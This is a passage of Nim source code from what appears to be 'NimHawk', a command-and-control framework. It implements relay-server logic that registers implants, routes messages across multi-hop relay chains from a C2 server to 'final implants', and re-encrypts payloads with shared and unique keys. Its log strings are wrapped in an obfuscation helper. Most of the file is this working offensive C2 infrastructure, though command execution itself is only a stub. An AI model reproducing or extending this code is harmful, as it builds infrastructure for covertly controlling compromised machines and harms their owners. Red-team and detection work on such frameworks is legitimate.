                                            # IDENTITY COLLISION PREVENTION: Check if this ID is already registered
                                            if server.clientRegistry.hasKey(msg.fromID):
                                                let existingConnIndex = server.clientRegistry[msg.fromID]
                                                when defined debug:
                                                    echo obf("[IDENTITY] 🚨 ID COLLISION DETECTED during AUTO-REGISTER!")
                                                    echo obf("[IDENTITY] 🚨 Client ID '") & msg.fromID & obf("' already mapped to connection ") & $existingConnIndex
                                                    echo obf("[IDENTITY] 🚨 New message from connection ") & $i & obf(" trying to use same ID")
                                                
                                                # Check if existing connection is still active
                                                if existingConnIndex < server.connections.len and server.connections[existingConnIndex].isConnected:
                                                    when defined debug:
                                                        echo obf("[IDENTITY] 🚨 EXISTING connection ") & $existingConnIndex & obf(" is STILL ACTIVE - REJECTING new registration")
                                                        echo obf("[IDENTITY] 🚨 This prevents identity theft between active clients")
                                                    # REJECT the auto-registration - don't overwrite active client
                                                    continue
                                                else:
                                                    when defined debug:
                                                        echo obf("[IDENTITY] ✅ Existing connection ") & $existingConnIndex & obf(" is DEAD - allowing re-registration")
                                                        echo obf("[IDENTITY] ✅ Cleaning up dead connection and registering new one")
                                                    # Clean up the dead connection mapping
                                                    server.clientRegistry.del(msg.fromID)
                                            
                                            # Safe to register now
                                            conn.clientID = msg.fromID
                                            server.connections[i].clientID = msg.fromID
                                            server.connections[i].lastActivity = epochTime().int64
                                            server.clientRegistry[msg.fromID] = i
                                            when defined debug:
                                                echo obf("[IDENTITY] 🆔 AUTO-REGISTERED: Connection ") & $i & obf(" now has clientID: '") & msg.fromID & obf("'")
                                                echo obf("[IDENTITY] 📊 Registry state: ") & $server.clientRegistry.len & obf(" clients")
                                                var registryState = ""
                                                for id, idx in server.clientRegistry:
                                                    if registryState != "": registryState.add(", ")
                                                    registryState.add(id & "→" & $idx)
                                                echo obf("[IDENTITY] 📋 Registry: [") & registryState & obf("]")
                                                echo obf("[IDENTITY] ✅ Client '") & msg.fromID & obf("' should now be able to receive unicast messages!")
                                        elif conn.clientID != "" and conn.clientID == msg.fromID:
                                            when defined debug:
                                                echo obf("[IDENTITY] ✅ Message from REGISTERED client: '") & msg.fromID & obf("' (connection ") & $i & obf(")")
                                        elif conn.clientID != "" and conn.clientID != msg.fromID and msg.fromID != "PENDING-REGISTRATION":
                                            when defined debug:
                                                echo obf("[IDENTITY] 🚨🚨🚨 IDENTITY CONTAMINATION DETECTED! 🚨🚨🚨")
                                                echo obf("[IDENTITY] 🚨 Connection ") & $i & obf(" was registered as: '") & conn.clientID & obf("'")
                                                echo obf("[IDENTITY] 🚨 But message claims fromID: '") & msg.fromID & obf("'")
                                                echo obf("[IDENTITY] 🚨 This is the BUG! Client is trying to change its ID!")
                                                echo obf("[IDENTITY] 🚨 REGISTRY STATE AT TIME OF CONTAMINATION:")
                                                for id, idx in server.clientRegistry:
                                                    echo obf("[IDENTITY] 🚨   ") & id & obf(" → connection ") & $idx
                                                echo obf("[IDENTITY] 🚨 CONNECTION STATES:")
                                                for j, c in server.connections:
                                                    let cStatus = if c.isConnected: "ACTIVE" else: "DEAD"
                                                    let cID = if c.clientID != "": c.clientID else: "unregistered"
                                                    echo obf("[IDENTITY] 🚨   Connection ") & $j & obf(": ") & cID & obf(" (") & cStatus & obf(")")
                                                echo obf("[IDENTITY] 🚨 REJECTING contaminated message to preserve client identity")
                                        elif msg.fromID == "PENDING-REGISTRATION":
                                            when defined debug:
                                                echo obf("[IDENTITY] 📝 Connection ") & $i & obf(" processing PENDING-REGISTRATION message")
                                        
                                        # Update last activity for existing clients
                                        if conn.clientID != "":
                                            server.connections[i].lastActivity = epochTime().int64
                                        
                                        # FASE 3: Route message using persistent routing system
                                        when defined debug:
                                            echo "[ROUTING] 🚀 === PROCESSING MESSAGE THROUGH ROUTING SYSTEM ==="
                                            echo "[ROUTING] 🚀 Message type: " & $msg.msgType
                                            echo "[ROUTING] 🚀 From ID: " & msg.fromID
                                            echo "[ROUTING] 🚀 Message ID: " & msg.id
                                            echo "[ROUTING] 🚀 Current route: " & $msg.route
                                            echo "[ROUTING] 🚀 Payload length: " & $msg.payload.len
                                            echo "[ROUTING] 🚀 Connection index: " & $i
                                        
                                        # CRITICAL FIX: Special handling for REGISTER, PULL, and CHAIN_INFO messages
                                        if msg.msgType == REGISTER or msg.msgType == PULL or msg.msgType == CHAIN_INFO:
                                            when defined debug:
                                                echo "[ROUTING] 🚀 📝 " & $msg.msgType & " message detected - applying special routing logic"
                                                echo "[ROUTING] 🚀 📝 isConnectedToRelay: " & $isConnectedToRelay
                                            
                                            if isConnectedToRelay:
                                                # INTERMEDIATE RELAY: Forward upstream toward primary relay
                                                when defined debug:
                                                    echo "[ROUTING] 🚀 📝 INTERMEDIATE RELAY: Forwarding " & $msg.msgType & " upstream"
                                                
                                                let routingSuccess = routeMessage(server, msg)
                                                if routingSuccess:
                                                    when defined debug:
                                                        echo "[ROUTING] 🚀 📝 ✅ " & $msg.msgType & " forwarded upstream successfully"
                                                else:
                                                    when defined debug:
                                                        echo "[ROUTING] 🚀 📝 ❌ " & $msg.msgType & " forward failed"
                                            else:
                                                # PRIMARY RELAY: Process locally (send to httpHandler)
                                                when defined debug:
                                                    echo "[ROUTING] 🚀 📝 PRIMARY RELAY: Processing " & $msg.msgType & " locally"
                                                    echo "[ROUTING] 🚀 📝 Adding " & $msg.msgType & " to result for httpHandler"
                                                
                                                result.add(msg)
                                        else:
                                            # Regular message routing (non-REGISTER)
                                            when defined debug:
                                                echo "[ROUTING] 🚀 🔄 Regular message - using standard routing"
                                            
                                            # Route the message - this handles forwarding and local processing
                                            let routingSuccess = routeMessage(server, msg)
                                            
                                            if routingSuccess:
                                                when defined debug:
                                                    echo "[ROUTING] 🚀 ✅ Message routed successfully"
                                                
                                                # For local processing, add to result
                                                # (Messages that are forwarded don't need to be in result)
                                                let currentID = getCurrentRelayID(server)
                                                let routeAnalysis = analyzeRoute(msg.route, currentID)
                                                
                                                when defined debug:
                                                    echo "[ROUTING] 🚀 Route analysis results:"
                                                    echo "[ROUTING] 🚀 - Current relay ID: " & currentID
                                                    echo "[ROUTING] 🚀 - Is for us: " & $routeAnalysis.isForUs
                                                    echo "[ROUTING] 🚀 - Next hop: " & routeAnalysis.nextHop
                                                    echo "[ROUTING] 🚀 - Hops from origin: " & $routeAnalysis.hopsFromOrigin
                                                
                                                if routeAnalysis.isForUs:
                                                    when defined debug:
                                                        echo "[ROUTING] 🚀 🏠 Message is for local processing - adding to result"
                                                    result.add(msg)
                                                else:
                                                    when defined debug:
                                                        echo "[ROUTING] 🚀 🔄 Message was forwarded - not adding to result"
                                            else:
                                                when defined debug:
                                                    echo "[ROUTING] 🚀 ❌ Message routing failed"
                                                # For failed routing, still add to result for debugging
                                                result.add(msg)
                                        
                                        when defined debug:
                                            echo "[ROUTING] 🚀 === END PROCESSING MESSAGE THROUGH ROUTING SYSTEM ==="
                                else:
                                    when defined debug:
                                        echo obf("[RELAY] Incomplete message from connection ") & $i
                                    break  # Exit loop, connection has issues
                            else:
                                when defined debug:
                                    echo obf("[RELAY] Invalid message length from connection ") & $i
                                conn.isConnected = false
                                break  # Exit loop, connection is bad
                        elif bytesRead == 0:
                            # Connection closed
                            conn.isConnected = false
                            when defined debug:
                                echo obf("[RELAY] Connection ") & $i & obf(" closed by peer")
                            break  # Exit loop, connection closed
                        else:
                            # bytesRead < 0 means no data available (EAGAIN/EWOULDBLOCK) - normal for non-blocking
                            when defined debug:
                                if messagesRead > 0:
                                    echo obf("[RELAY] Connection ") & $i & obf(" no more data, read ") & $messagesRead & obf(" messages total")
                            break  # Exit loop, no more data available
                    
                    except:
                        # Connection error or no data available
                        let errorMsg = getCurrentExceptionMsg()
                        if "Operation would block" notin errorMsg and "Resource temporarily unavailable" notin errorMsg:
                            conn.isConnected = false
                            when defined debug:
                                echo obf("[RELAY] Connection ") & $i & obf(" error: ") & errorMsg
                        else:
                            when defined debug:
                                if messagesRead > 0:
                                    echo obf("[RELAY] Connection ") & $i & obf(" no more data available, read ") & $messagesRead & obf(" messages total")
                        break  # Exit loop, no more data or connection error
            else:
                when defined debug:
                    echo obf("[RELAY] Connection ") & $i & obf(" is not active")
        
    except:
        when defined debug:
            echo obf("[RELAY] Error during server poll: ") & getCurrentExceptionMsg()
    
    # CRITICAL: Clean up dead connections after each poll cycle
    when defined debug:
        echo obf("[IDENTITY] 🧹 Starting connection cleanup...")
        var beforeCleanup = ""
        for i, conn in server.connections:
            let status = if conn.isConnected: "ACTIVE" else: "DEAD"
            let clientInfo = if conn.clientID != "": conn.clientID else: "unregistered"
            if beforeCleanup != "": beforeCleanup.add(", ")
            beforeCleanup.add($i & ":" & clientInfo & "(" & status & ")")
        echo obf("[IDENTITY] 🧹 Before cleanup: [") & beforeCleanup & obf("]")
    
    cleanupConnections(server)
    
    when defined debug:
        echo obf("[IDENTITY] 🧹 After cleanup completed...")
        var afterCleanup = ""
        for i, conn in server.connections:
            let status = if conn.isConnected: "ACTIVE" else: "DEAD"
            let clientInfo = if conn.clientID != "": conn.clientID else: "unregistered"
            if afterCleanup != "": afterCleanup.add(", ")
            afterCleanup.add($i & ":" & clientInfo & "(" & status & ")")
        echo obf("[IDENTITY] 🧹 After cleanup: [") & afterCleanup & obf("]")
        
        # Show registry state after cleanup
        var registryAfterCleanup = ""
        for id, idx in server.clientRegistry:
            if registryAfterCleanup != "": registryAfterCleanup.add(", ")
            registryAfterCleanup.add(id & "→" & $idx)
        echo obf("[IDENTITY] 🧹 Registry after cleanup: [") & registryAfterCleanup & obf("]")
    
    when defined debug:
        let finalConnections = server.connections.len
        var activeCount = 0
        var registeredCount = 0
        for conn in server.connections:
            if conn.isConnected:
                activeCount += 1
                if conn.clientID != "":
                    registeredCount += 1
        echo obf("[RELAY] Poll completed - Total: ") & $finalConnections & obf(", Active: ") & $activeCount & obf(", Registered: ") & $registeredCount
        
        # Log connected clients
        if registeredCount > 0:
            var clientList = ""
            for clientID in server.clientRegistry.keys:
                if clientList != "": clientList.add(", ")
                clientList.add(clientID)
            echo obf("[MULTI-CLIENT] 📋 Connected clients: ") & clientList

# Broadcast message to all downstream connections (LEGACY - avoid if possible)
proc broadcastMessage*(server: var RelayServer, msg: RelayMessage): int =
    result = 0
    when defined debug:
        echo obf("[MULTI-CLIENT] 📡 Broadcasting message (type: ") & $msg.msgType & obf(") to ") & $server.connections.len & obf(" connections")
    
    for conn in server.connections.mitems:
        if conn.isConnected:
            if sendMessage(conn, msg):
                result += 1
                when defined debug:
                    let clientInfo = if conn.clientID != "": conn.clientID else: "unregistered"
                    echo obf("[MULTI-CLIENT] ✅ Broadcast sent to: ") & clientInfo

# sendToAgent function removed - use sendToClient instead

# Get connection statistics with multi-client info
proc getConnectionStats*(server: RelayServer): tuple[listening: bool, connections: int, registeredClients: int] =
    result.listening = server.isListening
    result.connections = 0
    result.registeredClients = 0
    
    for conn in server.connections:
        if conn.isConnected:
            result.connections += 1
            if conn.clientID != "":
                result.registeredClients += 1

# Determine if a client is a final destination (not another relay)
proc isDestinationFinal*(server: RelayServer, clientID: string): bool =
    # Logic to determine if clientID is a final implant vs relay
    # For now, assume clients with "RELAY" in ID are relays
    # This can be enhanced with capability detection
    result = not clientID.contains("RELAY")
    
    when defined debug:
        let destType = if result: "FINAL IMPLANT" else: "RELAY NODE"
        echo "[DEBUG] 🎯 Route analysis: '" & clientID & "' is " & destType

# Analyze route to determine next hop strategy
proc analyzeRoute*(route: seq[string], currentID: string): tuple[isForUs: bool, nextHop: string, hopsFromOrigin: int] =
    result.hopsFromOrigin = route.len
    result.isForUs = false
    result.nextHop = ""
    
    when defined debug:
        echo "[DEBUG] 🗺️ Route analysis:"
        echo "[DEBUG] 🗺️ - Current ID: '" & currentID & "'"
        echo "[DEBUG] 🗺️ - Route: " & $route
        echo "[DEBUG] 🗺️ - Hops from origin: " & $result.hopsFromOrigin
    
    # Check if message is destined for us
    if route.len > 0 and route[^1] == currentID:
        result.isForUs = true
        when defined debug:
            echo "[DEBUG] 🗺️ - Message IS FOR US (final destination)"
        return
    
    # For forwarding, we need routing logic here
    # This is where topology knowledge would help
    # For now, broadcast to all connected clients (will be improved in FASE 4)
    when defined debug:
        echo "[DEBUG] 🗺️ - Message needs FORWARDING"

# Forward message with route persistence
proc forwardMessage*(server: var RelayServer, msg: RelayMessage, targetClientID: string = ""): bool =
    when defined debug:
        echo "[DEBUG] 🚀 ┌─────────── FORWARDING MESSAGE ───────────┐"
        echo "[DEBUG] 🚀 │ Original route: " & $msg.route & " │"
        echo "[DEBUG] 🚀 │ Message type: " & $msg.msgType & " │"
        echo "[DEBUG] 🚀 │ Target client: '" & targetClientID & "' │"
        echo "[DEBUG] 🚀 └─────────────────────────────────────────────┘"
    
    # Create forwarded message with updated route
    var forwardedMsg = msg
    let currentID = getCurrentRelayID()
    
    # CRITICAL: Add our ID to route for traceability
    if currentID notin forwardedMsg.route:
        forwardedMsg.route.add(currentID)
        when defined debug:
            echo "[DEBUG] 📍 Added relay ID '" & currentID & "' to route"
            echo "[DEBUG] 📍 Updated route: " & $forwardedMsg.route
    else:
        when defined debug:
            echo "[DEBUG] ⚠️ Relay ID '" & currentID & "' already in route (loop prevention)"
    
    # Determine if target is final destination or relay
    let isFinalDestination = if targetClientID != "":
        isDestinationFinal(server, targetClientID)
    else:
        false  # Unknown target, assume relay
    
    # Reencrypt payload with appropriate key
    try:
        if isFinalDestination:
            # Final destination: use unique key encryption
            forwardedMsg.payload = reencryptPayload(msg.payload, useUniqueKey = true)
            when defined debug:
                echo "[DEBUG] 🔐 Reencrypted with UNIQUE key (final destination)"
        else:
            # Relay hop: use shared key encryption
            forwardedMsg.payload = reencryptPayload(msg.payload, useUniqueKey = false)
            when defined debug:
                echo "[DEBUG] 🔐 Reencrypted with SHARED key (relay hop)"
    except:
        when defined debug:
            echo "[DEBUG] ❌ Reencryption failed: " & getCurrentExceptionMsg()
        return false
    
    # Send to specific client or broadcast
    var success = false
    if targetClientID != "":
        # FASE 4: Unicast to specific client (critical for response routing)
        success = sendToClient(server, targetClientID, forwardedMsg)
        when defined debug:
            if success:
                echo "[DEBUG] ✅ Message forwarded to specific client: " & targetClientID
                if isResponseMessage(forwardedMsg.msgType):
                    echo "[DEBUG] 🔙 Response successfully routed back one hop!"
            else:
                echo "[DEBUG] ❌ Failed to forward to client: " & targetClientID
                if isResponseMessage(forwardedMsg.msgType):
                    echo "[DEBUG] 🔙 ⚠️ Response routing FAILED - breaking reverse path!"
    else:
        # Broadcast to all connected clients (fallback routing for forward messages)
        let sent = broadcastMessage(server, forwardedMsg)
        success = sent > 0
        when defined debug:
            if success:
                echo "[DEBUG] ✅ Message broadcast to " & $sent & " clients"
            else:
                echo "[DEBUG] ❌ Broadcast failed - no connected clients"
    
    return success

# Handle message destined for this relay
proc handleLocalMessage*(server: var RelayServer, msg: RelayMessage): bool =
    when defined debug:
        echo "[DEBUG] 🏠 Handling local message of type: " & $msg.msgType
    
    # This function will be expanded to handle different message types
    # For now, just acknowledge receipt
    case msg.msgType:
    of REGISTER:
        when defined debug:
            echo "[DEBUG] 🏠 Processing local REGISTER message"
        # Handle registration locally
        return true
        
    of PULL:
        when defined debug:
            echo "[DEBUG] 🏠 Processing local PULL message"
        # Handle pull request locally
        return true
        
    of COMMAND:
        when defined debug:
            echo "[DEBUG] 🏠 Processing local COMMAND message"
        # Execute command locally
        return true
        
    else:
        when defined debug:
            echo "[DEBUG] 🏠 Unknown local message type: " & $msg.msgType
        return false

# Route message intelligently based on destination
proc routeMessage*(server: var RelayServer, msg: RelayMessage): bool =
    when defined debug:
        echo "[ROUTING] 🧭 === ROUTE MESSAGE START ==="
        echo "[ROUTING] 🧭 Message ID: " & msg.id
        echo "[ROUTING] 🧭 From: " & msg.fromID
        echo "[ROUTING] 🧭 Type: " & $msg.msgType
        echo "[ROUTING] 🧭 Route: " & $msg.route
        echo "[ROUTING] 🧭 Payload size: " & $msg.payload.len
        echo "[ROUTING] 🧭 Timestamp: " & $msg.timestamp
    
    let currentID = getCurrentRelayID()
    when defined debug:
        echo "[ROUTING] 🧭 Current relay ID: " & currentID
    
    let isResponse = isResponseMessage(msg.msgType)
    when defined debug:
        echo "[ROUTING] 🧭 Is response message: " & $isResponse
    
    let routeAnalysis = analyzeRouteDirection(msg.route, currentID, isResponse)
    when defined debug:
        echo "[ROUTING] 🧭 Route analysis completed:"
        echo "[ROUTING] 🧭 - Is for us: " & $routeAnalysis.isForUs
        echo "[ROUTING] 🧭 - Should route: " & $routeAnalysis.shouldRoute
        echo "[ROUTING] 🧭 - Next hop: " & routeAnalysis.nextHop
        echo "[ROUTING] 🧭 - Hops from origin: " & $routeAnalysis.hopsFromOrigin
    
    # FASE 4: Debug route decision for troubleshooting
    debugRouteDecision(msg, currentID)
    
    # Check if message is for us
    if routeAnalysis.isForUs:
        when defined debug:
            if isResponse:
                echo "[ROUTING] 🧭 🎯 Response reached ORIGIN - processing locally"
            else:
                echo "[ROUTING] 🧭 🎯 Forward message is for this relay - processing locally"
        
        let localResult = handleLocalMessage(server, msg)
        when defined debug:
            echo "[ROUTING] 🧭 Local message handling result: " & $localResult
            echo "[ROUTING] 🧭 === ROUTE MESSAGE END (LOCAL) ==="
        return localResult
    
    # Message needs routing
    if not routeAnalysis.shouldRoute:
        when defined debug:
            echo "[ROUTING] 🧭 ⚠️ Message analysis indicates no routing needed - this shouldn't happen"
            echo "[ROUTING] 🧭 === ROUTE MESSAGE END (NO ROUTING) ==="
        return false
    
    when defined debug:
        if isResponse:
            echo "[ROUTING] 🧭 🔙 Response message - using reverse routing"
        else:
            echo "[ROUTING] 🧭 🔽 Forward message - using downstream routing"
    
    # Determine target client based on routing analysis
    var targetClient = ""
    
    if isResponse:
        # FASE 4: Response messages use reverse routing with specific target
        targetClient = routeAnalysis.nextHop
        when defined debug:
            echo "[ROUTING] 🧭 🔙 Response routing target: '" & targetClient & "'"
    else:
        # Forward messages use broadcast routing (can be improved with topology)
        when defined debug:
            echo "[ROUTING] 🧭 🔽 Forward message - using broadcast routing"
        # targetClient remains empty for broadcast
    
    when defined debug:
        echo "[ROUTING] 🧭 Forwarding message to: " & (if targetClient != "": "'" & targetClient & "'" else: "ALL CLIENTS (broadcast)")
    
    # Forward the message
    let forwardResult = forwardMessage(server, msg, targetClient)
    when defined debug:
        echo "[ROUTING] 🧭 Forward message result: " & $forwardResult
        echo "[ROUTING] 🧭 === ROUTE MESSAGE END (FORWARDED) ==="
    
    return forwardResult

# === FASE 4: VALIDATION AND DEBUGGING FUNCTIONS ===

# Validate that a route is valid for reverse routing
proc validateRouteForReverse*(route: seq[string], currentID: string): tuple[isValid: bool, reason: string] =
    result.isValid = false
    result.reason = ""
    
    if route.len == 0:
        result.reason = "Route is empty"
        return
    
    # Check if current ID is in the route
    var foundAtIndex = -1
    for i, id in route:
        if id == currentID:
            foundAtIndex = i
            break
    
    if foundAtIndex == -1:
        result.reason = "Current ID '" & currentID & "' not found in route"
        return
    
    if foundAtIndex == 0:
        result.reason = "Current ID is at origin position - cannot reverse route"
        return
    
    result.isValid = true
    result.reason = "Route is valid for reverse routing"

# Debug function to trace a message's routing decision
proc debugRouteDecision*(msg: RelayMessage, currentID: string) =
    when defined debug:
        echo "[DEBUG] 🔍 ┌─────────── ROUTE DECISION DEBUG ───────────┐"
        echo "[DEBUG] 🔍 │ Message ID: " & msg.id & " │"
        echo "[DEBUG] 🔍 │ Type: " & $msg.msgType & " │"
        echo "[DEBUG] 🔍 │ From: " & msg.fromID & " │"
        echo "[DEBUG] 🔍 │ Current Relay: " & currentID & " │"
        echo "[DEBUG] 🔍 │ Route: " & $msg.route & " │"
        echo "[DEBUG] 🔍 └─────────────────────────────────────────────┘"
        
        let isResponse = isResponseMessage(msg.msgType)
        let routeAnalysis = analyzeRouteDirection(msg.route, currentID, isResponse)
        
        echo "[DEBUG] 🔍 Route Analysis:"
        echo "[DEBUG] 🔍 - Is Response: " & $isResponse
        echo "[DEBUG] 🔍 - Is For Us: " & $routeAnalysis.isForUs
        echo "[DEBUG] 🔍 - Should Route: " & $routeAnalysis.shouldRoute
        echo "[DEBUG] 🔍 - Next Hop: '" & routeAnalysis.nextHop & "'"
        echo "[DEBUG] 🔍 - Hops from Origin: " & $routeAnalysis.hopsFromOrigin
        
        if isResponse:
            let validation = validateRouteForReverse(msg.route, currentID)
            echo "[DEBUG] 🔍 Reverse Route Validation:"
            echo "[DEBUG] 🔍 - Valid: " & $validation.isValid
            echo "[DEBUG] 🔍 - Reason: " & validation.reason
            
            if validation.isValid:
                let prevHop = calculatePreviousHop(msg.route, currentID)
                echo "[DEBUG] 🔍 - Previous Hop: '" & prevHop.previousHop & "'"

# === FASE 5: PERFORMANCE OPTIMIZATION AND MEMORY MANAGEMENT ===

# Optimized route management with memory efficiency
proc optimizeRouteMemory*(msg: var RelayMessage): bool =
    try:
        # Remove duplicate entries in route (keep only first occurrence)
        var uniqueRoute: seq[string] = @[]
        for id in msg.route:
            if id notin uniqueRoute:
                uniqueRoute.add(id)
        
        let originalLen = msg.route.len
        msg.route = uniqueRoute
        
        when defined debug:
            if originalLen != msg.route.len:
                echo "[OPTIMIZE] 🧹 Route memory optimized: " & $originalLen & " → " & $msg.route.len & " entries"
        
        return true
        
    except:
        when defined debug:
            echo "[OPTIMIZE] ❌ Route memory optimization failed: " & getCurrentExceptionMsg()
        return false

# Batch processing for multiple messages
proc processBatchMessages*(server: var RelayServer, messages: seq[RelayMessage]): tuple[processed: int, failed: int] =
    result.processed = 0
    result.failed = 0
    
    when defined debug:
        echo "[BATCH] 📦 Processing batch of " & $messages.len & " messages"
    
    for msg in messages:
        var optimizedMsg = msg
        if optimizeRouteMemory(optimizedMsg):
            if routeMessage(server, optimizedMsg):
                result.processed += 1
            else:
                result.failed += 1
                when defined debug:
                    echo "[BATCH] ❌ Failed to route message: " & msg.id
        else:
            result.failed += 1
            when defined debug:
                echo "[BATCH] ❌ Failed to optimize message: " & msg.id
    
    when defined debug:
        echo "[BATCH] 📦 Batch processing completed: " & $result.processed & " processed, " & $result.failed & " failed"

# Route cache for performance improvement
var g_routeCache: Table[string, seq[string]]

proc cacheRoute*(sourceID: string, targetID: string, route: seq[string]) =
    let cacheKey = sourceID & "→" & targetID
    g_routeCache[cacheKey] = route
    
    when defined debug:
        echo "[CACHE] 💾 Cached route: " & cacheKey & " = " & $route

proc getCachedRoute*(sourceID: string, targetID: string): tuple[found: bool, route: seq[string]] =
    let cacheKey = sourceID & "→" & targetID
    
    if g_routeCache.hasKey(cacheKey):
        result.found = true
        result.route = g_routeCache[cacheKey]
        when defined debug:
            echo "[CACHE] 💾 Cache hit: " & cacheKey & " = " & $result.route
    else:
        result.found = false
        result.route = @[]
        when defined debug:
            echo "[CACHE] 💾 Cache miss: " & cacheKey

# Clear route cache to manage memory
proc clearRouteCache*() =
    let cacheSize = g_routeCache.len
    g_routeCache.clear()
    
    when defined debug:
        echo "[CACHE] 🧹 Route cache cleared: " & $cacheSize & " entries removed"

# Advanced routing statistics
type
    RoutingStats* = object
        totalMessages*: int
        forwardMessages*: int
        responseMessages*: int
        localMessages*: int
        routingErrors*: int
        avgRouteLength*: float
        maxRouteLength*: int
        cacheHits*: int
        cacheMisses*: int

var g_routingStats: RoutingStats

proc updateRoutingStats*(msg: RelayMessage, routingSuccess: bool, wasLocal: bool) =
    g_routingStats.totalMessages += 1
    
    if routingSuccess:
        if wasLocal:
            g_routingStats.localMessages += 1
        else:
            if isResponseMessage(msg.msgType):
                g_routingStats.responseMessages += 1
            else:
                g_routingStats.forwardMessages += 1
    else:
        g_routingStats.routingErrors += 1
    
    # Update route length statistics
    if msg.route.len > g_routingStats.maxRouteLength:
        g_routingStats.maxRouteLength = msg.route.len
    
    # Calculate average route length
    if g_routingStats.totalMessages > 0:
        g_routingStats.avgRouteLength = (g_routingStats.avgRouteLength * float(g_routingStats.totalMessages - 1) + float(msg.route.len)) / float(g_routingStats.totalMessages)

proc getAdvancedRoutingStats*(): RoutingStats =
    result = g_routingStats
    
    when defined debug:
        echo "[STATS] 📊 Advanced Routing Statistics:"
        echo "[STATS] 📊 - Total Messages: " & $result.totalMessages
        echo "[STATS] 📊 - Forward Messages: " & $result.forwardMessages
        echo "[STATS] 📊 - Response Messages: " & $result.responseMessages
        echo "[STATS] 📊 - Local Messages: " & $result.localMessages
        echo "[STATS] 📊 - Routing Errors: " & $result.routingErrors
        echo "[STATS] 📊 - Avg Route Length: " & $result.avgRouteLength
        echo "[STATS] 📊 - Max Route Length: " & $result.maxRouteLength
        echo "[STATS] 📊 - Cache Hits: " & $result.cacheHits
        echo "[STATS] 📊 - Cache Misses: " & $result.cacheMisses

# Reset routing statistics
proc resetRoutingStats*() =
    g_routingStats = RoutingStats()
    
    when defined debug:
        echo "[STATS] 🔄 Routing statistics reset"

# System health check
proc performSystemHealthCheck*(): tuple[healthy: bool, issues: seq[string]] =
    result.healthy = true
    result.issues = @[]
    
    when defined debug:
        echo "[HEALTH] 🏥 Performing system health check..."
    
    # Check key configuration
    let keyStatus = getKeyConfigStatus()
    if not keyStatus.hasShared:
        result.healthy = false
        result.issues.add("Shared key not configured")
    
    # Check routing statistics
    let stats = getAdvancedRoutingStats()
    if stats.totalMessages > 0:
        let errorRate = float(stats.routingErrors) / float(stats.totalMessages)
        if errorRate > 0.1:  # More than 10% error rate
            result.healthy = false
            result.issues.add("High routing error rate: " & $(errorRate * 100.0) & "%")
    
    # Check route cache efficiency
    let totalCacheRequests = g_routingStats.cacheHits + g_routingStats.cacheMisses
    if totalCacheRequests > 0:
        let cacheHitRate = float(g_routingStats.cacheHits) / float(totalCacheRequests)
        if cacheHitRate < 0.5:  # Less than 50% cache hit rate
            result.issues.add("Low cache hit rate: " & $(cacheHitRate * 100.0) & "%")
    
    # Check memory usage
    if g_routeCache.len > 1000:  # Too many cached routes
        result.issues.add("Route cache too large: " & $g_routeCache.len & " entries")
    
    when defined debug:
        echo "[HEALTH] 🏥 Health check completed:"
        echo "[HEALTH] 🏥 - System healthy: " & $result.healthy
        echo "[HEALTH] 🏥 - Issues found: " & $result.issues.len
        for issue in result.issues:
            echo "[HEALTH] 🏥 - Issue: " & issue

# Complete system diagnostic
proc runCompleteSystemDiagnostic*(): string =
    result = "[NIMHAWK SYSTEM DIAGNOSTIC]\n"
    result &= "==========================================\n\n"
    
    # System health
    let health = performSystemHealthCheck()
    result &= "🏥 SYSTEM HEALTH: " & (if health.healthy: "✅ HEALTHY" else: "⚠️ ISSUES FOUND") & "\n"
    for issue in health.issues:
        result &= "   ⚠️ " & issue & "\n"
    result &= "\n"
    
    # Key configuration
    let keyStatus = getKeyConfigStatus()
    result &= "🔐 KEY CONFIGURATION:\n"
    result &= "   🆔 Implant ID: " & keyStatus.implantID & "\n"
    result &= "   🔑 Shared Key: " & (if keyStatus.hasShared: "✅ Available" else: "❌ Missing") & "\n"
    result &= "   🔐 Unique Key: " & (if keyStatus.hasUnique: "✅ Available" else: "❌ Missing") & "\n"
    result &= "\n"
    
    # Routing statistics
    let stats = getAdvancedRoutingStats()
    result &= "📊 ROUTING STATISTICS:\n"
    result &= "   📈 Total Messages: " & $stats.totalMessages & "\n"
    result &= "   🔽 Forward Messages: " & $stats.forwardMessages & "\n"
    result &= "   🔙 Response Messages: " & $stats.responseMessages & "\n"
    result &= "   🏠 Local Messages: " & $stats.localMessages & "\n"
    result &= "   ❌ Routing Errors: " & $stats.routingErrors & "\n"
    result &= "   📏 Avg Route Length: " & $stats.avgRouteLength & " hops\n"
    result &= "   📐 Max Route Length: " & $stats.maxRouteLength & " hops\n"
    result &= "\n"
    
    # Cache performance
    result &= "💾 CACHE PERFORMANCE:\n"
    result &= "   📊 Cache Hits: " & $stats.cacheHits & "\n"
    result &= "   📊 Cache Misses: " & $stats.cacheMisses & "\n"
    result &= "   📦 Cache Size: " & $g_routeCache.len & " entries\n"
    
    let totalCacheRequests = stats.cacheHits + stats.cacheMisses
    if totalCacheRequests > 0:
        let hitRate = float(stats.cacheHits) / float(totalCacheRequests) * 100.0
        result &= "   📊 Hit Rate: " & $hitRate & "%\n"
    
    result &= "\n"
    
    # System tests
    let testResults = testDistributedRoutingSystem()
    result &= "🧪 SYSTEM TESTS:\n"
    result &= "   ✅ Passed: " & $testResults.passed & "\n"
    result &= "   ❌ Failed: " & $testResults.failed & "\n"
    result &= "   📊 Success Rate: " & $(if testResults.passed + testResults.failed > 0: (testResults.passed * 100) div (testResults.passed + testResults.failed) else: 0) & "%\n"
    
    result &= "\n==========================================\n"
    result &= "🎉 NIMHAWK DISTRIBUTED ROUTING SYSTEM READY\n"
    result &= "==========================================\n"

# === INTEGRATION AND TESTING FUNCTIONS ===

# Complete system integration demo
proc demonstrateRoutingSystem*() =
    when defined debug:
        echo ""
        echo "🚀 =================================================="
        echo "🚀 NIMHAWK DISTRIBUTED ROUTING SYSTEM DEMO"
        echo "🚀 =================================================="
        echo ""
        echo "🎯 SYSTEM CAPABILITIES:"
        echo "   ✅ Persistent route tracing"
        echo "   ✅ Reverse routing for responses"
        echo "   ✅ Differentiated key encryption"
        echo "   ✅ Loop prevention"
        echo "   ✅ Multi-hop relay chains"
        echo ""
        echo "🛰️  NETWORK TOPOLOGY EXAMPLE:"
        echo "   🎯 C2 Server"
        echo "      ↕️ (unique key)"
        echo "   🛰️  Relay Root"
        echo "      ↕️ (shared key)"
        echo "   🛰️  Relay Intermediate"
        echo "      ↕️ (shared key)"
        echo "   🛰️  Relay Deep"
        echo "      ↕️ (unique key)"
        echo "   🤖 Final Implant"
        echo ""
        echo "🔄 MESSAGE FLOW:"
        echo "   📤 Forward: Implant → C2 (downstream, broadcast)"
        echo "   📥 Response: C2 → Implant (upstream, unicast)"
        echo ""
